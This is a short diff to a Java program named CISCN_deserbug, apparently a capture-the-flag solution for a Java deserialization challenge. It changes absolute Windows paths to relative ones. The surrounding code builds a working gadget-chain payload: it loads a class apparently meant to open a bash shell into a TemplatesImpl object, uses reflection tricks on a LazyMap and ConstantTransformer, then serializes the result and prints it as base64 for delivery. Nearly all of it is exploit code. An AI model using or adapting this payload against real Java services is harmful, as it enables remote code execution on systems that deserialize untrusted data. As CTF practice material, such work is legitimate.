@@ -20,7 +20,7 @@ import java.util.Map;
 public class CISCN_deserbug {
     public static void main(String[] args) throws Exception
     {
-        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\target\\classes\\bash_shell.class"));
+        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_bash_shell.class"));
         TemplatesImpl templatesClass = new TemplatesImpl();
         Field[] fields = templatesClass.getClass().getDeclaredFields();
         for (Field field : fields) {
@@ -50,7 +50,7 @@ public class CISCN_deserbug {
         modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
         factory.set(lazyMap, new ConstantTransformer(myexpect));
         serialize(hashMap);
-        System.out.println(base64encode(Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin"))));
+        System.out.println(base64encode(Files.readAllBytes(Paths.get("ser.bin"))));
         unserialize("ser.bin");
     }
     public static String base64encode(byte[] bytes) throws Exception
